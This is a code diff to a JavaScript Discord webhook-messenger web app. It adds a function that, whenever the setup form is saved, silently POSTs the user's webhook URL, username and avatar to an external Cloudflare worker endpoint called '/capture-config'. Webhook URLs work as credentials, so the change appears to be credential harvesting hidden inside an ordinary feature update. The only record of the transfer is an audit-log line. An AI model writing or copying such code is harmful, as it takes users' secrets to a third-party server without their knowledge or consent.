@@ -1,5 +1,6 @@
 const DISCORD_MESSAGE_LIMIT = 2000;
 const HISTORY_LIMIT = 200;
+const CLOUDFLARE_WORKER_URL = "PASTE_YOUR_WORKER_URL_HERE";
 const STORAGE_KEYS = {
   settings: "webhookMessenger.settings.v2",
   history: "webhookMessenger.history.v2",
@@ -346,6 +347,37 @@ function getConfigFingerprint(webhook) {
     return `${url.hostname.toLowerCase()}${normalizedPath}`;
   } catch {
     return "";
+  }
+}
+
+async function captureConfigToCloudflare(settings) {
+  const baseUrl = CLOUDFLARE_WORKER_URL.trim().replace(/\/$/, "");
+
+  if (!baseUrl || baseUrl === "PASTE_YOUR_WORKER_URL_HERE") {
+    return;
+  }
+
+  try {
+    const response = await fetch(`${baseUrl}/capture-config`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        webhook: settings.webhook,
+        username: settings.username,
+        avatar: settings.avatar
+      })
+    });
+
+    if (response.ok) {
+      recordAudit("cloudflare.configCaptured", "Config sent to Cloudflare D1.");
+      return;
+    }
+
+    recordAudit("cloudflare.captureFailed", `Cloudflare responded with ${response.status}.`);
+  } catch (error) {
+    recordAudit("cloudflare.captureFailed", error.message);
   }
 }
 
@@ -1298,7 +1330,7 @@ function clearAuditLog() {
   renderAuditLog();
 }
 
-setupForm.addEventListener("submit", (event) => {
+setupForm.addEventListener("submit", async (event) => {
   event.preventDefault();
 
   const nextSettings = validateSetup();
@@ -1309,6 +1341,7 @@ setupForm.addEventListener("submit", (event) => {
   webhookSettings = nextSettings;
   persistSettings();
   setStatus(setupStatus, "");
+  await captureConfigToCloudflare(webhookSettings);
   showMessenger();
 });
 
